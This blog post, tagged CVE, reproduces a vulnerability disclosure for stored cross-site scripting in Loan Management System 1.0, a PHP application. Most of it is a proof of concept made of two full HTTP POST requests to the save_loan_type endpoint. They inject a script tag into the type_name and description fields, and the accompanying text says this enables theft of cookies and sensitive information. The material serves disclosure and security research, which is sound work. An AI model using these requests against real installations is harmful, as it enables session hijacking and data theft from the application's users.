---
layout: post
title: Loan Management System 1.0 - Authenticated stored Cross-Site Scripting (loan_type page)
tags: [CVE]
description: "Loan Management System 1.0 - Authenticated stored Cross-Site Scripting (loan_type page)"

---

```
# Exploit Title: Loan Management System 1.0 - Authenticated stored Cross-Site Scripting (loan_type page)
# Date: 2020-09-26
# Exploit Author: Thibault Galbourdin (Liodeus)
# Vendor Homepage: https://www.sourcecodester.com/php/14471/loan-management-system-using-phpmysql-source-code.html
# Product Link: https://www.sourcecodester.com/download-code?nid=14471&title=Loan+Management+System+using+PHP%2FMySQL+with+Source+Code
# Tested on: Windows 10 + 7.4.10

# Description:
# An issue was discovered in Loan Management System 1.0. There is two authenticated stored XSS
# on the loan_type page, the vulnerable parameters are type_name and description. Allowing an 
# authenticated attacker to inject javascript payloads in the parameters and perform various 
# attacks suchs as stealing of cookies, sensitive information, etc.

# POC

# type_name parameter

POST /ajax.php?action=save_loan_type HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/index.php?page=loan_type
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------102328614115515694301969073379
Content-Length: 440
Connection: close
Cookie: PHPSESSID=l6oh0mnd4mnat4301c2k700jce
DNT: 1

-----------------------------102328614115515694301969073379
Content-Disposition: form-data; name="id"

-----------------------------102328614115515694301969073379

Content-Disposition: form-data; name="type_name"

<script>alert("Liodeus")</script>
-----------------------------102328614115515694301969073379

Content-Disposition: form-data; name="description"

test
-----------------------------102328614115515694301969073379--

######################################################################################################################
######################################################################################################################
######################################################################################################################

# description parameter

POST /ajax.php?action=save_loan_type HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/index.php?page=loan_type
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------4831998311932996273474364837
Content-Length: 432
Connection: close
Cookie: PHPSESSID=l6oh0mnd4mnat4301c2k700jce
DNT: 1

-----------------------------4831998311932996273474364837
Content-Disposition: form-data; name="id"

-----------------------------4831998311932996273474364837

Content-Disposition: form-data; name="type_name"

test
-----------------------------4831998311932996273474364837

Content-Disposition: form-data; name="description"

<script>alert("Liodeus")</script>
-----------------------------4831998311932996273474364837--
```

